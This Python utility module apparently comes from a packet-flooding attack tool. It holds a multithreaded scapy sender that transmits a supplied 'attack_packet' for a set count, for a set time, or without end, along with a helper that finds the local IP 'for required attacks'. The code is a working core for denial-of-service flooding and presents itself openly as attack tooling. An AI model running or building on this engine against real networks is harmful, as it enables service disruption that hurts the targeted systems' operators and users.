"""
This Script contains utility functions which are re-used throughout the program
Author: Joseph Whalley
Date: 8/5/23
Version: 1.2
"""
import socket
import sys
import threading
import time

from scapy.sendrecv import send


def send_packets(attack_packet, num_threads, limit_value, limit_choice):
    """
       Sends the packets from hosts device as well as handling the limits set by the user.

       Parameters:
       attack_packet (string): The packet to be used in the attack
       num_threads (int): The number of threads used in the attack used to calculate packets sent.
       limit_value (int): The value of the limiter chosen by the user.
       limit_choice (string): The limiter the user wants to use.
       """
    packet_count = 0

    if limit_choice == "packet":
        try:
            for i in range(limit_value):
                send(attack_packet, verbose=0)

                packet_count += 1
                sys.stdout.write(f"\rSent {packet_count * num_threads} packets.")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print("[!] Interrupted by user")

    if limit_choice == "time" and limit_value == 0:
        try:
            while True:
                send(attack_packet, verbose=0)

                packet_count += 1
                sys.stdout.write(f"\rSent {packet_count * num_threads} packets.")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print("[!] Interrupted by user")

    if limit_choice == "time":
        start_time = time.time()
        try:
            while time.time() - start_time < limit_value:
                send(attack_packet, verbose=0)

                packet_count += 1
                sys.stdout.write(f"\rSent {packet_count * num_threads} packets.")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print("[!] Interrupted by user")

    print("[+] Attack finished")


def thread_packets(attack_packet, num_threads, limit_choice, limit_value):
    """
           Handles the creation of threads.

           Parameters:
           attack_packet (string): The packet to be used in the attack. Passed to send_packets.
           num_threads (int): The number of threads to create.
           limit_value (int): The value of the limiter chosen by the user.Passed to send_packets.
           limit_choice (string): The limiter the user wants to use. Passed to send_packets.
           """
    threads = []

    for i in range(num_threads):
        t = threading.Thread(target=send_packets, args=(attack_packet, num_threads, limit_value, limit_choice))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()


def get_my_ip():
    """
    Used to grab the hosts source IP for required attacks.

    Returns:
    string The hosts source IP.
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create socket object
    s.connect(("8.8.8.8", 80))  # Connect to the Google DNS server at IP address 8.8.8.8 and port 80
    return s.getsockname()[0]  # Retrieve the IP address of the local end of the socket and return
